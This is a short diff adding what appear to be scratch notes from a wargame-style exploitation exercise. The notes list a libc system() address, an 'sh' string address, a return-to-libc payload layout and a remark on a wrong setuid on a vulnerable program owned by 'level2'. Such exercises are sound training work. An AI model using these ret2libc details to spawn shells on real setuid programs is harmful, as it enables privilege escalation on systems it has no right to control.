@@ -1,0 +1,7 @@
+system_addr 0xb76b6690
+"sh\0" string_addr 0x8048894
+
+ret in libc:
+0xb76b6690,0x8048894, 0x8048894
+
+wrong setuid on vulnerable app(owner level2)
